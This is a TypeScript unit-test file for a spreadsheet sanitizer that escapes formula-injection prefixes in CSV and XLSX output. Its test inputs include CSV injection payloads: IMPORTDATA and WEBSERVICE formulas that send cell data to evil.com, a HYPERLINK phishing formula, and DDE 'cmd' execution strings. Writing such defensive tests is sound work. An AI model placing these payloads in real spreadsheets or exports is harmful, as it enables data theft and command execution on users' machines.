/**
 * Unit tests for formula injection sanitization (Card 1.7)
 * Covers:
 *   - sanitizeCell: all dangerous prefixes (=, +, -, @, \t, \r)
 *   - sanitizeCell: safe values pass through unchanged
 *   - sanitizeHeaders: headers are sanitized
 *   - OWASP CSV injection payloads
 *   - Integration: generateOutputFile produces sanitized output
 *
 * Ref: https://owasp.org/www-community/attacks/CSV_Injection
 * @owner: @tester
 */
import { describe, it, expect } from 'vitest'
import Papa from 'papaparse'
import * as XLSX from 'xlsx'
import {
  sanitizeCell,
  sanitizeHeaders,
} from '../../src/lib/spreadsheet/sanitizer'
import {
  generateOutputFile,
  mergeSpreadsheets,
} from '../../src/lib/spreadsheet/merger'
import { MergedResult } from '../../src/lib/spreadsheet/types'

// ===========================================
// sanitizeCell — unit tests
// ===========================================
describe('sanitizeCell', () => {
  describe('dangerous prefixes are escaped', () => {
    it.each([
      ['=1+1', "'=1+1"],
      ['=IMPORTDATA("https://evil.com")', '\'=IMPORTDATA("https://evil.com")'],
      ['+1+1', "'+1+1"],
      ['-1-1', "'-1-1"],
      ['@SUM(A1:A10)', "'@SUM(A1:A10)"],
      ['\tcmd|calc', "'\tcmd|calc"],
      ['\rcmd|calc', "'\rcmd|calc"],
      ['\n=1+1', "'\n=1+1"],
    ])('sanitizes "%s" to "%s"', (input, expected) => {
      expect(sanitizeCell(input)).toBe(expected)
    })
  })

  describe('safe values pass through unchanged', () => {
    it('passes normal string', () => {
      expect(sanitizeCell('Hello World')).toBe('Hello World')
    })

    it('passes number', () => {
      expect(sanitizeCell(42)).toBe(42)
    })

    it('passes negative number (not string)', () => {
      expect(sanitizeCell(-5)).toBe(-5)
    })

    it('passes boolean true', () => {
      expect(sanitizeCell(true)).toBe(true)
    })

    it('passes boolean false', () => {
      expect(sanitizeCell(false)).toBe(false)
    })

    it('passes null', () => {
      expect(sanitizeCell(null)).toBeNull()
    })

    it('passes empty string', () => {
      expect(sanitizeCell('')).toBe('')
    })

    it('passes string starting with letter', () => {
      expect(sanitizeCell('Name')).toBe('Name')
    })

    it('passes string starting with number', () => {
      expect(sanitizeCell('123abc')).toBe('123abc')
    })

    it('passes string with formula char in middle', () => {
      expect(sanitizeCell('a=b+c')).toBe('a=b+c')
    })
  })

  // ===========================================
  // OWASP CSV injection payloads
  // ===========================================
  describe('OWASP CSV injection payloads', () => {
    it('blocks =IMPORTDATA exfiltration', () => {
      const payload = '=IMPORTDATA("https://evil.com/exfil?data="&A2)'
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks =HYPERLINK phishing', () => {
      const payload = '=HYPERLINK("https://evil.com","Click here")'
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks DDE command execution', () => {
      const payload = "=cmd|'/c calc'!A1"
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks +cmd DDE variant', () => {
      const payload = "+cmd|'/c calc'!A1"
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks -cmd DDE variant', () => {
      const payload = "-cmd|'/c calc'!A1"
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks @SUM formula', () => {
      const payload = '@SUM(A1:A100)'
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks tab-prefixed bypass', () => {
      const payload = '\t=1+1'
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks carriage-return-prefixed bypass', () => {
      const payload = '\r=1+1'
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks =WEBSERVICE exfiltration', () => {
      const payload = '=WEBSERVICE("https://evil.com/steal?val="&A1)'
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })

    it('blocks newline-prefixed bypass (Google Sheets vector)', () => {
      const payload = '\n=IMPORTDATA("https://evil.com")'
      expect(sanitizeCell(payload)).toBe(`'${payload}`)
    })
  })

  describe('single-char dangerous prefixes', () => {
    it.each([['='], ['+'], ['-'], ['@'], ['\t'], ['\r'], ['\n']])(
      'sanitizes single-char prefix "%s"',
      (input) => {
        expect(sanitizeCell(input)).toBe(`'${input}`)
      },
    )
  })
})

// ===========================================
// sanitizeHeaders
// ===========================================
describe('sanitizeHeaders', () => {
  it('sanitizes headers with dangerous prefixes', () => {
    const headers = ['Name', '=Formula', '+Sum', 'Email']
    expect(sanitizeHeaders(headers)).toEqual([
      'Name',
      "'=Formula",
      "'+Sum",
      'Email',
    ])
  })

  it('passes safe headers unchanged', () => {
    const headers = ['Name', 'Email', 'Phone']
    expect(sanitizeHeaders(headers)).toEqual(['Name', 'Email', 'Phone'])
  })

  it('handles empty array', () => {
    expect(sanitizeHeaders([])).toEqual([])
  })
})

// ===========================================
// Integration: generateOutputFile sanitizes output
// ===========================================
describe('generateOutputFile — formula injection prevention', () => {
  function makeMergedResult(
    headers: string[],
    rows: Record<string, string | number | boolean | null>[],
  ): MergedResult {
    return {
      headers,
      rows,
      totalRows: rows.length,
      sourcesCount: 1,
    }
  }

  describe('CSV output', () => {
    it('sanitizes formula cells in CSV output', () => {
      const merged = makeMergedResult(
        ['Name', 'Value'],
        [
          { Name: 'Alice', Value: '=1+1' },
          { Name: '=IMPORTDATA("https://evil.com")', Value: 'safe' },
        ],
      )

      const output = generateOutputFile(merged, 'csv')
      const csv = output.buffer.toString('utf-8')

      // Parse the CSV back to verify
      const parsed = Papa.parse<Record<string, string>>(csv, { header: true })
      const rows = parsed.data

      expect(rows[0].Value).toBe("'=1+1")
      expect(rows[1].Name).toBe('\'=IMPORTDATA("https://evil.com")')
    })

    it('sanitizes formula headers in CSV output', () => {
      const merged = makeMergedResult(
        ['=Header', 'Safe'],
        [{ '=Header': 'value1', Safe: 'value2' }],
      )

      const output = generateOutputFile(merged, 'csv')
      const csv = output.buffer.toString('utf-8')

      const parsed = Papa.parse<Record<string, string>>(csv, { header: true })
      const headers = parsed.meta.fields || []

      expect(headers[0]).toBe("'=Header")
    })

    it('preserves numbers and safe strings in CSV', () => {
      const merged = makeMergedResult(
        ['Name', 'Age'],
        [{ Name: 'Alice', Age: 30 }],
      )

      const output = generateOutputFile(merged, 'csv')
      const csv = output.buffer.toString('utf-8')

      const parsed = Papa.parse<Record<string, string>>(csv, { header: true })
      expect(parsed.data[0].Name).toBe('Alice')
      expect(parsed.data[0].Age).toBe('30')
    })
  })

  describe('XLSX output', () => {
    it('sanitizes formula cells in XLSX output', () => {
      const merged = makeMergedResult(
        ['Name', 'Value'],
        [
          { Name: 'Alice', Value: '=1+1' },
          { Name: '+cmd|calc', Value: 'safe' },
        ],
      )

      const output = generateOutputFile(merged, 'xlsx')

      // Parse the XLSX back
      const workbook = XLSX.read(output.buffer, { type: 'buffer' })
      const sheet = workbook.Sheets[workbook.SheetNames[0]]
      const data = XLSX.utils.sheet_to_json<Record<string, string>>(sheet)

      expect(data[0].Value).toBe("'=1+1")
      expect(data[1].Name).toBe("'+cmd|calc")
    })

    it('sanitizes formula headers in XLSX output', () => {
      const merged = makeMergedResult(
        ['-Header', 'Safe'],
        [{ '-Header': 'value1', Safe: 'value2' }],
      )

      const output = generateOutputFile(merged, 'xlsx')

      const workbook = XLSX.read(output.buffer, { type: 'buffer' })
      const sheet = workbook.Sheets[workbook.SheetNames[0]]
      const jsonData = XLSX.utils.sheet_to_json(sheet, {
        header: 1,
      }) as unknown[][]

      // First row is headers
      expect(jsonData[0][0]).toBe("'-Header")
    })

    it('preserves numbers in XLSX', () => {
      const merged = makeMergedResult(
        ['Name', 'Age'],
        [{ Name: 'Alice', Age: 30 }],
      )

      const output = generateOutputFile(merged, 'xlsx')

      const workbook = XLSX.read(output.buffer, { type: 'buffer' })
      const sheet = workbook.Sheets[workbook.SheetNames[0]]
      const data = XLSX.utils.sheet_to_json<Record<string, unknown>>(sheet)

      expect(data[0].Name).toBe('Alice')
      expect(data[0].Age).toBe(30)
    })
  })
})

// ===========================================
// Integration: mergeSpreadsheets + generateOutputFile
// ===========================================
describe('end-to-end: merge with malicious input produces safe output', () => {
  it('malicious cells in merged spreadsheet are sanitized in CSV output', () => {
    const result = mergeSpreadsheets(
      [
        {
          fileName: 'evil.csv',
          format: 'csv',
          headers: ['Nome', 'Email'],
          rows: [
            { Nome: '=IMPORTDATA("https://evil.com")', Email: 'a@b.com' },
            { Nome: '@SUM(A1:A10)', Email: '+cmd|calc' },
          ],
          rowCount: 2,
          fileSize: 100,
        },
      ],
      ['Nome', 'Email'],
    )

    const output = generateOutputFile(result, 'csv')
    const csv = output.buffer.toString('utf-8')

    // Parse-back e verifica que todas as celulas perigosas foram sanitizadas
    const parsed = Papa.parse<Record<string, string>>(csv, { header: true })

    for (const row of parsed.data) {
      for (const [col, val] of Object.entries(row)) {
        if (typeof val === 'string' && val.length > 0) {
          expect(
            val[0],
            `celula [${col}]="${val}" comeca com prefixo perigoso sem sanitizacao`,
          ).not.toMatch(/^[=+\-@\t\r\n]/)
        }
      }
    }
  })
})
